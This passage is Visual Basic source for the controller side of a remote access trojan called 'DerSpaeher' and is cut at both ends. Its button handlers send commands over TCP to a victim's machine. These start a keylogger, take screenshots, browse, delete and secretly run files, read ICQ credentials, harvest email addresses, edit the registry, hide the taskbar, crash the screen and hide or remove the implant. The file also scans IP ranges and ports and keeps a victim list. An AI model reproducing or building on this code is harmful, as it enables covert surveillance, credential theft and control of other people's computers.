DerSpaeher.WasSenden = "DLoeschen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 7 Then
DerSpaeher.WasSenden = "RenDatei": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 8 Then
WichtigG = "dateityp"
Dialog "Put the file type here ", "INPUT"

ElseIf Index = 9 Then
WichtigG = "verzeichnis"
Dialog "Put the path here", "INPUT"

ElseIf Index = 10 Then
WichtigG = "Unsichtbar"
Dialog "Do you like to start the file invisible?", "JaNein"

Else
End If

If Index <> 0 And Index <> 9 Then
BW
Else
End If
Exit Sub
z:
KeineVerbindung
End Sub

Private Sub lblDateiF_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If shpDateiLeiste.tOp = lblDateiF(Index).tOp Then
Exit Sub
Else
End If
shpDateiLeiste.tOp = lblDateiF(Index).tOp
End Sub


Private Sub lblDatumZeit_Click(Index As Integer)
On Error GoTo z
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If Index = 0 Then
Action.Text = "ZeitAbr"
DerSpaeher.WasSenden = "ZeitAbr": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 1 Then
Action.Text = "DatumAbrr"
DerSpaeher.WasSenden = "DatumAbr": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 2 Then
If txttextfelder(21).Text = "" Then
Dialog "and what time???", "OK"

Exit Sub
Else
End If
DerSpaeher.WasSenden = "ZeitV": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 3 Then
If txttextfelder(22).Text = "" Then
Dialog "and what date???", "OK"

Exit Sub
Else
End If
DerSpaeher.WasSenden = "DatumV": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
Else
End If
Exit Sub
z:
End Sub

Private Sub lblDatumZeit_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblDatumZeit(Index).ForeColor = &HFFFF00 Then
Exit Sub
Else
End If
Dim indx As Integer
For indx = 0 To 3
lblDatumZeit(indx).ForeColor = &HC0C000
Next
lblDatumZeit(Index).ForeColor = &HFFFF00
End Sub

Private Sub lblDesktop_Click(Index As Integer)
On Error GoTo z
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If Index = 0 Then
DerSpaeher.WasSenden = "vierfuenf": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "neunnull": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "achtnull": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 3 Then
DerSpaeher.WasSenden = "zickzack": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
Else
End If
Exit Sub
z:
KeineVerbindung
End Sub

Private Sub lblDesktop_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If lblDesktop(Index).ForeColor = &HC0C000 Then
Exit Sub
Else
End If
Dim indx As Integer
For indx = 0 To 3
lblDesktop(indx).ForeColor = &H404000
Next
lblDesktop(Index).ForeColor = &HC0C000
End Sub

Private Sub lblDialog_Click(Index As Integer)
If Index = 0 Then
WasWurdeG = "Ja"
If WichtigG = "Chat" Then
WichtigG = ""
Picture3.Visible = False
lblFunktionen(9).Caption = "close chat"
picContainer(15).Visible = True
Action.Text = "Chat"
DerSpaeher.WasSenden = "ChatOpen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Timer2.Enabled = True
ElseIf WichtigG = "Unsichtbar" Then
WichtigG = ""
Picture3.Visible = False
DerSpaeher.WasSenden = "DStartenU": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Exit Sub
Else
End If
ElseIf Index = 2 Then
WasWurdeG = "OK"
If Text11.Visible = True Then
If WichtigG = "OffT" Then
WichtigG = ""
List3.ToolTipText = Text11.Text
ElseIf WichtigG = "VerS" Then
WichtigG = ""
List4.ToolTipText = Text11.Text
ElseIf WichtigG = "UINHere" Then
If Text11.Text = "" Then
Exit Sub
Else
End If
DerSpaeher.WasSenden = "ICQM1" & Text11.Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf WichtigG = "UIN" Then
DerSpaeher.WasSenden = "ICQS" & Text11.Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "ICQU"
BW
ElseIf WichtigG = "wohindatei" Then
WichtigG = " "
DerSpaeher.WasSenden = Text11.Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf WichtigG = "renok" Then
WichtigG = ""
RenDatei = MomentanesVerzeichnis & "\" & Text11.Text
DerSpaeher.WasSenden = DateiName: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf WichtigG = "dateityp" Then
WichtigG = ""
DateiTyp = Text11.Text
DerSpaeher.WasSenden = "DateiTyp": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf WichtigG = "verzeichnis" Then
WichtigG = ""
Dim gg
gg = Text11.Text
If Laufwerk = True Then
BHJ = gg
Text7.Text = gg
Action.Text = "DateiVerz"
DerSpaeher.WasSenden = "VerzOKK": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
BHJ = gg
Text7.Text = gg
Action.Text = "DateiVerz"
DerSpaeher.WasSenden = "VerzOKK": InsStatus: tcp1.SendData DerSpaeher.WasSenden
End If
Else
End If
Else
End If
ElseIf Index = 1 Then
WasWurdeG = "Nein"
If WichtigG = "Chat" Then
WichtigG = ""
Picture3.Visible = False
Exit Sub
ElseIf WichtigG = "Unsichtbar" Then
WichtigG = ""
Picture3.Visible = False
DerSpaeher.WasSenden = "DStarten": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Exit Sub
Else
End If
Else
End If
Picture3.Visible = False
End Sub

Private Sub lblDialog_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If shpDialog(Index).BackColor = &HC0C000 Then
Exit Sub
Else
End If
Dim indx  As Integer
For indx = 0 To 2
shpDialog(indx).BackColor = &H404000
Next
shpDialog(Index).BackColor = &HC0C000
End Sub

Private Sub lblersatz_Click(Index As Integer)
On Error Resume Next
If Index = 5 Then
tcp1.RemotePort = Val(txttextfelder(35).Text)
If lblersatz(5).Caption = "connect" Then
If Option7.Value = True Then
ElseIf Option8.Value = True Then
ICQIP
Else
End If

VerbindungAufbauen
LampeVerbinden "Verbinde"
tmrVerbinden.Enabled = True
ElseIf lblersatz(5).Caption = "connecting" Then
VerbindungAufbauen
tmrVerbinden.Enabled = False
lblZeit.Caption = "10"
LampeVerbinden "Getrennt"
ElseIf lblersatz(5).Caption = "close" Then
VerbindungAufbauen
LampeVerbinden "Getrennt"
Else
End If
Else
End If
End Sub

Private Sub lblersatz_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
shpersatz(Index).BackColor = &HC0C000
End Sub

Private Sub lblextras_Click(Index As Integer)
On Error GoTo z
If Index <> 7 Or Index <> 8 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Else
End If
If Index = 0 Then

DerSpaeher.WasSenden = "CDOpen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "CDClose": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 3 Then
DerSpaeher.WasSenden = "TaskleisteFalse": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "TaskleisteTrue": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 4 Then
DerSpaeher.WasSenden = "STRGan": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 5 Then
DerSpaeher.WasSenden = "STRGaus": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 6 Then
DerSpaeher.WasSenden = "DesktopEinfrieren": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 7 Then
AlleAus
picContainer(22).Visible = True
ElseIf Index = 8 Then
AlleAus
picContainer(30).Visible = True
ElseIf Index = 9 Then
AlleAus
picContainer(24).Visible = True
ElseIf Index = 10 Then
AlleAus
picContainer(16).Visible = True
Else
End If
Exit Sub
z:
KeineVerbindung
End Sub

Private Sub lblextras_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
Dim a As Integer
For a = 0 To 10
lblextras(a).ForeColor = &H404000
Next
lblextras(Index).ForeColor = &HC0C000
End Sub

Private Sub lblFunktionen_Click(Index As Integer)
On Error Resume Next
If SpyJaNein = False Then
If lblFunktionen(9).Caption = "chat" Then
If TastaturUeberwachung = False Then
AlleAus
If Index = 0 Then
Action.Text = "DateiManager"
DerSpaeher.WasSenden = "DateiManager": InsStatus: tcp1.SendData DerSpaeher.WasSenden
LaufwerkAktiv = True
Laufwerk = True

picContainer(5).Visible = True
ElseIf Index = 26 Then
AlleAus
picContainer(39).Visible = True
ElseIf Index = 1 Then
picContainer(7).Visible = True
ElseIf Index = 2 Then
AlleAus
picContainer(32).Visible = True
ElseIf Index = 3 Then
picContainer(9).Visible = True
ElseIf Index = 4 Then
picContainer(33).Visible = True
ElseIf Index = 5 Then
picContainer(13).Visible = True
ElseIf Index = 6 Then
picContainer(11).Visible = True
ElseIf Index = 7 Then
picContainer(10).Visible = True
ElseIf Index = 8 Then
Load Status
Status.Show
ElseIf Index = 9 Then
If lblFunktionen(9).Caption = "chat" Then
Dim gGg
If tcp1.State = 0 Then
Exit Sub
Else
End If
WichtigG = "Chat"
Dialog "Are you sure you want to open a Chat Room", "JaNein"
Else
End If
ElseIf Index = 10 Then
DerSpaeher.WasSenden = "MSG": InsStatus: tcp1.SendData DerSpaeher.WasSenden
picContainer(14).Visible = True
ElseIf Index = 11 Then
picContainer(37).Visible = True
ElseIf Index = 12 Then
picContainer(28).Visible = True
ElseIf Index = 13 Then
Action.Text = "SysI"
DerSpaeher.WasSenden = "SysInfo": InsStatus: tcp1.SendData DerSpaeher.WasSenden
picContainer(17).Visible = True
ElseIf Index = 14 Then
Action.Text = ""
DerSpaeher.WasSenden = "SoundAbSpielen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
picContainer(12).Visible = True
ElseIf Index = 15 Then
picContainer(34).Visible = True
ElseIf Index = 16 Then
picContainer(29).Visible = True
ElseIf Index = 17 Then
picContainer(35).Visible = True
ElseIf Index = 18 Then
picContainer(38).Visible = True
VictimsLaden
ElseIf Index = 19 Then
picContainer(0).Visible = True
ElseIf Index = 20 Then
picContainer(1).Visible = True
ElseIf Index = 21 Then
picContainer(3).Visible = True
ElseIf Index = 22 Then
picContainer(2).Visible = True
ElseIf Index = 23 Then
picContainer(4).Visible = True
ElseIf Index = 24 Then
picContainer(20).Visible = True
ElseIf Index = 25 Then
DerSpaeher.WasSenden = "msdosskribt": InsStatus: tcp1.SendData DerSpaeher.WasSenden
picContainer(26).Visible = True
Else
End If
Else
lblErgebnis.Caption = "Close the keylogger first"
ErgebnissAnz
End If
Else
If Index = 9 Then
Timer2.Enabled = False
DerSpaeher.WasSenden = "ChatClose": InsStatus: tcp1.SendData DerSpaeher.WasSenden
lblFunktionen(9).Caption = "chat"
txtChatClient = ""
txtChatServer = ""
Else
End If
lblErgebnis.Caption = "Close the chat first"
ErgebnissAnz
End If
Else
lblErgebnis.Caption = "set spy to off first"
ErgebnissAnz
End If
End Sub
Sub AlleAus()
On Error Resume Next
Dim a As Integer
For a = 0 To 40
picContainer(a).Visible = False
Next
End Sub

Private Sub lblFunktionen_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
Dim indx As Integer
For indx = 0 To lblFunktionenAnzahl
If lblFunktionen(indx).ForeColor = &HFFFFC0 Then GoTo u
lblFunktionen(indx).ForeColor = &HFFFFC0

u:
Next
lblFunktionen(Index).ForeColor = shpNormalFarbe
End Sub

Private Sub lblGemein_Click(Index As Integer)
On Error GoTo X
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If Index = 0 Then
DerSpaeher.WasSenden = "ComputerAusschalten": InsStatus: tcp1.SendData DerSpaeher.WasSenden
lblErgebnis.Caption = "packet send"
ErgebnissAnz
GoTo 20
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "ComputerNeuStarten": InsStatus: tcp1.SendData DerSpaeher.WasSenden
lblErgebnis.Caption = "packet send"
ErgebnissAnz
GoTo 20
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "WindowsAbmelden": InsStatus: tcp1.SendData DerSpaeher.WasSenden
lblErgebnis.Caption = "packet send"
ErgebnissAnz
GoTo 20
ElseIf Index = 3 Then
DerSpaeher.WasSenden = "BildschirmAbsturz": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
GoTo 20
ElseIf Index = 4 Then
DerSpaeher.WasSenden = "ZweiSpalten": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
GoTo 20
ElseIf Index = 5 Then
DerSpaeher.WasSenden = "ZwischenLeeren": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
GoTo 20
Else
End If
20:
Exit Sub
X:
KeineVerbindung
End Sub

Private Sub lblGemein_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
Dim indx As Integer
If lblGemein(Index).ForeColor = &HFFFF00 Then
Exit Sub
Else
End If
For indx = 0 To 5
lblGemein(indx).ForeColor = &HC0C000
Next
lblGemein(Index).ForeColor = &HFFFF00
End Sub

Private Sub lblICQ_Click(Index As Integer)
On Error GoTo z
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If Index = 0 Then
DerSpaeher.WasSenden = "ICQP": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "ICQP"
BW
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "ICQU": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "ICQU"
BW
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "ICQC": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 3 Then
DerSpaeher.WasSenden = "ICQN": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "ICQU"
BW
ElseIf Index = 4 Then
DerSpaeher.WasSenden = "ICQF": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "ICQU"
BW

ElseIf Index = 5 Then
DerSpaeher.WasSenden = "ICQO": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "ICQU"
BW
ElseIf Index = 6 Then
DerSpaeher.WasSenden = "ICQG": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "ICQU"
BW

ElseIf Index = 7 Then
WichtigG = "UIN"
Dialog "Put here the UIN", "INPUT"
ElseIf Index = 8 Then
If txttextfelder(34).Text = "" Then
Dialog "Put the message-text into the textbox", "OK"
Exit Sub
Else
End If
WichtigG = "UINHere"
Dialog "Put the UIN here", "INPUT"
Else
End If
Exit Sub
z:
KeineVerbindung
End Sub

Private Sub lblICQ_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblICQ(Index).ForeColor = &HC0C000 Then Exit Sub
Dim indx As Integer
For indx = 0 To 8
lblICQ(indx).ForeColor = &H404000
Next
lblICQ(Index).ForeColor = &HC0C000

End Sub

Private Sub lblInternet_Click(Index As Integer)
On Error GoTo X
AlleAus
If Index = 0 Then
picContainer(23).Visible = True
ElseIf Index = 1 Then
picContainer(21).Visible = True
ElseIf Index = 2 Then
picContainer(36).Visible = True
If BitteWartenOderNicht = "True" Then

Text4.Text = "Sorry, there is another process in work..."
Exit Sub
Else
End If
DerSpaeher.WasSenden = "AppRedirect2": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "AppRedirect2"
BW
Else
End If
Exit Sub
X:
KeineVerbindung
End Sub


Private Sub lblInternet_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
If lblInternet(Index).ForeColor = &HC0C000 Then
Exit Sub
Else
End If
Dim indx As Integer
For indx = 0 To 3
lblInternet(indx).ForeColor = &H404000
Next
lblInternet(Index).ForeColor = &HC0C000
End Sub



Private Sub lblMaus_Click(Index As Integer)
On Error GoTo X
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If Index = 0 Then
DerSpaeher.WasSenden = "MausVertauschen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "MausRichtig": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
Else
End If
Exit Sub
X:
KeineVerbindung
End Sub

Private Sub lblMaus_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
Dim indx As Integer
For indx = 0 To 1
lblMaus(indx).ForeColor = &HC0C000
Next
lblMaus(Index).ForeColor = &HFFFF00
End Sub

Private Sub lblSO_Click(Index As Integer)
On Error GoTo z
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If Index = 0 Then
DerSpaeher.WasSenden = "ServerSichtbar": InsStatus: tcp1.SendData DerSpaeher.WasSenden
lblErgebnis.Caption = "server option  send"
ErgebnissAnz
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "ServerUnsichtbar": InsStatus: tcp1.SendData DerSpaeher.WasSenden
lblErgebnis.Caption = "server option  send"
ErgebnissAnz
ElseIf Index = 3 Then
DerSpaeher.WasSenden = "ServerSchliessen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
lblErgebnis.Caption = "server option  send"
ErgebnissAnz
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "ServerEntfernen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
lblErgebnis.Caption = "server option  send"
ErgebnissAnz
ElseIf Index = 4 Then
If txttextfelder(6).Text = "" Then
Dialog "Hey, you must input a password!", "OK"

Exit Sub
Else
End If
DerSpaeher.WasSenden = "Passwortaendern": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
End If
Exit Sub
z:
End Sub

Private Sub lblSO_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblSO(Index).ForeColor = &HFFFF00 Then Exit Sub
Dim indx As Integer
For indx = 0 To 4
lblSO(indx).ForeColor = &HC0C000
Next
lblSO(Index).ForeColor = &HFFFF00
End Sub

Private Sub lblSounds_Click(Index As Integer)
On Error GoTo z
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If Index = 0 Then
DerSpaeher.WasSenden = "a": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "b": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 2 Then
DerSpaeher.WasSenden = "c": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 3 Then
DerSpaeher.WasSenden = "d": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 4 Then
DerSpaeher.WasSenden = "e": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
End If
BW
Exit Sub
z:
KeineVerbindung
End Sub

Private Sub lblSounds_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblSounds(Index).ForeColor = &HFFFF00 Then
Exit Sub
Else
End If
Dim indx As Integer
For indx = 0 To 4
lblSounds(indx).ForeColor = &HC0C000
Next
lblSounds(Index).ForeColor = &HFFFF00
End Sub


Private Sub lblStandarts_MouseDown(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
frmLinks = X
frmOben = Y
End Sub

Private Sub lblStandarts_MouseUp(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
DerSpaeher.left = DerSpaeher.left - frmLinks + X
DerSpaeher.tOp = DerSpaeher.tOp - frmOben + Y
End Sub

Private Sub lblTast_Click(Index As Integer)
On Error GoTo z
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If Index = 0 Then
DerSpaeher.WasSenden = "DateiLeeren": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 1 Then
DerSpaeher.WasSenden = "OffStatus": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "OffStatus"
BW
Else
End If

Exit Sub
z:
KeineVerbindung
End Sub

Private Sub lblTast_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
If lblTast(Index).ForeColor = &HC0C000 Then
Exit Sub
Else
End If
Dim indx As Integer
For indx = 0 To 1
lblTast(indx).ForeColor = &H404000
Next
lblTast(Index).ForeColor = &HC0C000
End Sub

Private Sub lblTastatur_Click(Index As Integer)
AlleAus
If Index = 0 Then
picContainer(18).Visible = True
ElseIf Index = 1 Then
picContainer(19).Visible = True
ElseIf Index = 2 Then
picContainer(31).Visible = True
Else
End If
End Sub

Private Sub lblTastatur_MouseMove(Index As Integer, Button As Integer, Shift As Integer, X As Single, Y As Single)
On Error Resume Next
Dim a As Integer
For a = 0 To 2
lblTastatur(1).ForeColor = &H404000
Next
lblTastatur(Index).ForeColor = &HC0C000
End Sub
Sub SocketClose()
Dim Socket As Variant
For Each Socket In ipscanner
        Socket.Close
        Unload Socket
    Next
End Sub
Private Sub lblUeberschrift_Click(Index As Integer)
On Error GoTo X
If Index = 0 Then
ServerBinaerOeffnen2
BW
ElseIf Index = 27 Then

DerSpaeher.WasSenden = "OffAn": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 26 Then
DerSpaeher.WasSenden = "OffAus": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 1 Then
BW
ServerBinaerOeffnen
ElseIf Index = 35 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Text2.Text = List2.Text
Text2.SelStart = 0
Text2.SelLength = GetSetting("Abc", "Abc", List2.ListIndex)
DateiZumBeenden = Text2.SelText
DerSpaeher.WasSenden = DateiZumBeenden: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 2 Then
SaveSetting "DerSpaeher3", "Notiz", "Notiz", txttextfelder(12).Text
ElseIf Index = 41 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Text2.Text = List2.Text
Text2.SelStart = 0
Text2.SelLength = GetSetting("Abc", "Abc", List2.ListIndex)
DateiZumBeenden = Text2.SelText
DerSpaeher.WasSenden = "FensterHide" & DateiZumBeenden: InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 42 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Text2.Text = List2.Text
Text2.SelStart = 0
Text2.SelLength = GetSetting("Abc", "Abc", List2.ListIndex)
DateiZumBeenden = Text2.SelText
DerSpaeher.WasSenden = "FensterMax" & DateiZumBeenden: InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 43 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Text2.Text = List2.Text
Text2.SelStart = 0
Text2.SelLength = GetSetting("Abc", "Abc", List2.ListIndex)
DateiZumBeenden = Text2.SelText
DerSpaeher.WasSenden = "FensterMin" & DateiZumBeenden: InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 37 Then
AlleAus
picContainer(20).Visible = True
ElseIf Index = 3 Then
lblueberschrift(3).Caption = "please wait..."
AuslesenEMail
lblueberschrift(3).Caption = "current settings"
ElseIf Index = 37 Then
AlleAus
picContainer(20).Visible = True
ElseIf Index = 4 Then
lblueberschrift(4).Caption = "please wait..."
AuslesenTarnen
lblueberschrift(4).Caption = "current settings"
ElseIf Index = 5 Then
If lblueberschrift(38).Caption = "Who is online..." Then
If txttextfelder(40).Text = "" Or txttextfelder(41).Text = "" Then
Dialog "Hey! Fill out all the textboxes!", "OK"
Exit Sub
Else
End If

VicSave
Else

End If
ElseIf Index = 40 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If txttextfelder(42).Text = "" Then
Dialog "Hey! Fill out the textbox", "OK"
Exit Sub
Else
End If
DerSpaeher.WasSenden = "RegDest" & txttextfelder(42).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 38 Then
If lblueberschrift(38).Caption = "Who is online..." Then
lblueberschrift(38).Caption = "please wait..."
WerIstOnline
Else

End If
ElseIf Index = 39 Then
VicSave2
ElseIf Index = 25 Then
txttextfelder(33).Text = ""
Exit Sub

ElseIf Index = 6 Then
txttextfelder(13).Locked = True
StartIPScannen
ElseIf Index = 36 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
DerSpaeher.WasSenden = "AppRedirect" & txttextfelder(38).Text: InsStatus: tcp1.SendData DerSpaeher.WasSenden
Action.Text = "AppRedirect"
BW
ElseIf Index = 7 Then
StillSearching2 = False
SocketClose
txttextfelder(13).Locked = False
IPZahlMomentan = 0
ElseIf Index = 8 Then
lstIPErgebnisse.Clear
ElseIf Index = 9 Then

If lblueberschrift(9).Caption = "screenshot" Then
DerSpaeher.WasSenden = "ScreenShoot": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
lblueberschrift(9).Caption = "stop"
lblScreenshoot.Caption = "waiting..."
Else

DerSpaeher.WasSenden = "DownUpAbbrechenWirklich": InsStatus: tcp1.SendData DerSpaeher.WasSenden

End If
ElseIf Index = 23 Then
PortScannen
ElseIf Index = 24 Then
StillSearching = False
ElseIf Index = 11 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If txttextfelder(14).Text <> "" And txttextfelder(15).Text <> "" Then
DerSpaeher.WasSenden = "Registrierung": InsStatus: tcp1.SendData DerSpaeher.WasSenden
Else
Dialog "You have forgotten something :(", "OK"
End If
ElseIf Index = 12 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If txttextfelder(14).Text <> "" And txttextfelder(15).Text <> "" And txttextfelder(16).Text <> "" Then
DerSpaeher.WasSenden = "RegSetzen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
Else
Dialog "You have forgotten something :(", "OK"
End If
ElseIf Index = 13 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
DerSpaeher.WasSenden = "MausBewegen": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 14 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
DerSpaeher.WasSenden = "PingPongan": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 15 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
DerSpaeher.WasSenden = "PingPongaus": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW

ElseIf Index = 28 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
DerSpaeher.WasSenden = "URL": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 20 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
If txttextfelder(24).Text = "" Then
Dialog "You have forgotten something!!!", "OK"
Exit Sub
Else
End If
DerSpaeher.WasSenden = "SendKey": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 22 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Action.Text = "EmailsFinden"
DerSpaeher.WasSenden = "EmailsFinden": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 19 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Action.Text = "KeySpy"
DerSpaeher.WasSenden = "KeySpy": InsStatus: tcp1.SendData DerSpaeher.WasSenden
TastaturUeberwachung = True
ElseIf Index = 16 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Action.Text = ""
DerSpaeher.WasSenden = "KeySpyAus": InsStatus: tcp1.SendData DerSpaeher.WasSenden
BW
ElseIf Index = 21 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Action.Text = "AlleFenster"
DerSpaeher.WasSenden = "AlleFensterErmitteln": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 10 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Text2.Text = List2.Text
Text2.SelStart = 0
Text2.SelLength = GetSetting("Abc", "Abc", List2.ListIndex)
DateiZumBeenden = Text2.SelText
DerSpaeher.WasSenden = "WindowsEnde" & DateiZumBeenden: InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 17 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
Action.Text = "SysI"
DerSpaeher.WasSenden = "SysInfo": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 32 Then
BitteWartenOderNicht
If BitteWartenOderNicht = "True" Then

Exit Sub
Else
End If
DerSpaeher.WasSenden = "PortRedirect" & txttextfelder(29).Text & "IP" & tcp1.LocalIP & "PORT" & "2004": InsStatus: tcp1.SendData DerSpaeher.WasSenden
ElseIf Index = 33 Then
BitteWartenOderNicht
